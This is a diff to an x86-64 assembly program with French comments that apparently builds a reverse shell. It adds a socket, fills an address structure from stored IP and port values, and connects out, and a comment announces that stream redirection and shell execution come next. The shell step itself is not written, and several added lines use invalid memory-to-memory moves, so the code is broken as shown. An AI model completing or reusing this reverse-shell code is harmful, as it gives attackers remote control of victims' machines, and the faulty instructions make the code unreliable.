@@ -32,7 +32,9 @@ section .data
     env db 0
 
 section .bss
-    sockaddr_in resb 16
+    sockfd resq 1
+    sockaddr_in resb 16 ; Struct pour stocker l'IP de connexion
+
 section .text
     global _start
 
@@ -49,9 +51,25 @@ _start:
     js socket_error
     
     ; Sauvegarde du descripteur de socket
-    mov rdi, rax           ; rdi contient maintenant le descripteur de socket
-    jmp exit               ; Pour l'instant, on saute à la sortie
+    mov [sockfd], rax
+    ; Remplissage de la structure
+    mov word [sockaddr_in], AF_INET
+    mov word [sockaddr_in + 2], [port]
+    mov dword [sockaddr_in + 4], [ip]
+
+    mov rax, SYS_CONNECT               ; connexion au serv
+    mov rdi, [sockfd]                  ; descripteur de socket
+    mov rsi, sockaddr_in               ; adresse de connexion
+    mov rdx, 16                        ; taille structure
+    syscall
+    test rax, rax
+    js connect_error
+
+    ; la connexion est établie
+    ; redirection des flux et exec du shell
     
+    jmp exit
+
 socket_error:
     ; ERROR
     jmp exit
